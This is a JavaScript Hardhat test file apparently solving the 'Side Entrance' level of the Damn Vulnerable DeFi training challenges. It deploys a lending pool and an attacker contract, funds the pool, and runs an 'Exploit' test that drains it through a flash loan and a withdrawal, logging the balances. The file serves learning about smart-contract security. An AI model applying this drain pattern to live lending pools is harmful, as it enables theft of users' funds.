const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("Side Entrance Damn Vulnerable DEFI", function(){

    let owner, account1, hacker,
        SideEntranceLenderPool, sideEntrance,
        AttackerSide,attack;

    before(async()=>{

        [owner, account1, hacker] = await ethers.getSigners();


        //Deploy SideEntranceLenderPool
        SideEntranceLenderPool = await ethers.getContractFactory("SideEntranceLenderPool");
        sideEntrance = await SideEntranceLenderPool.deploy();
        await sideEntrance.deployed();


        //Deploy AttackerSide
        AttackerSide = await ethers.getContractFactory("AttackerSide");
        attack = await AttackerSide.connect(hacker).deploy(sideEntrance.address);
        await attack.deployed();


        //Send 550 Ether to the SideEntranceLenderPool
        await sideEntrance.deposit({value:ethers.utils.parseEther("500")});
        await sideEntrance.connect(account1).deposit({value:ethers.utils.parseEther("50")});



        let EtherAmountInSideEntrance = await ethers.provider.getBalance(sideEntrance.address);
        console.log("");
        console.log("Ether in SideEntrance Pool:", (EtherAmountInSideEntrance/10**18).toString(), "Ether");
        console.log("");
    });



    //Attacker Exploit
    it("Exploit",async()=>{

        await attack.connect(hacker).callFlash();

        await attack.connect(hacker).withdrawAll();

        let ETHAmountInSideEntrancePoolAfter = await ethers.provider.getBalance(sideEntrance.address);
        console.log("ETH Amount in EntranceSide After Exploit:", (ETHAmountInSideEntrancePoolAfter/10**18).toString(), "ETH");

        let ETHAmountHackerAfterExploit = await ethers.provider.getBalance(hacker.address);
        console.log("Hacker ETH balance After Exploit:", (ETHAmountHackerAfterExploit/10**18).toString(), "ETH");
    });

})